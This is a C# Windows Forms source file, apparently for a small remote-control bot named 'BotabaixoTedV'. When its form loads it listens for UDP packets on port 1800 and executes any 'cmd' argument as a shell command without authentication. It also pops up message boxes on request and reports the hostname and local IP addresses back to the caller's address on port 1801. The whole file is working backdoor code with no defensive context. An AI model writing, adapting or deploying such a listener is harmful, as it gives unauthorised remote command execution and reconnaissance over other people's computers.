﻿#region Usings
using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static ScriptsLib.nNetwork.Packets;
using static ScriptsLib.Tools;
#endregion Usings



namespace BotabaixoTedV
{
    public partial class BTV : Form
    {
        public BTV()
        {
            InitializeComponent();
        }

        private void BTV_Load(object sender, EventArgs e)
        {
            new Task(new Action(() =>
            {
                while (true)
                {
                    string[] _Packet = WaitUdpPacket(1800).Split('|');

                    if (_Packet[0] == "cmd") // 0: cmd | 1: arg
                    {
                        ExecuteCmdCommand(_Packet[1]);
                    }
                    else if (_Packet[0] == "msg") // 0: cmd | 1: arg
                    {
                        new Task(new Action(() =>
                        {
                            MessageBox.Show(_Packet[1]);
                        })).Start();
                    }
                    else if (_Packet[0] == "call") // 0: cmd | 1: delay | 2: caller ip
                    {
                        Thread.Sleep(Convert.ToInt32(_Packet[1]) * 2);

                        string _Ips = null;
                        foreach (var _Ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
                        {
                            if (_Ip.AddressFamily == AddressFamily.InterNetwork)
                            {
                                if (string.IsNullOrEmpty(_Ips)) _Ips = _Ip.ToString();
                                else _Ips = $"{_Ips}, {_Ip}";
                            }
                        }
                        SendUdpPacket(_Packet[2], 1801, $"PC: {Dns.GetHostName()}\nIPs: {_Ips}");
                    }
                }
            })).Start();
        }
    }
}
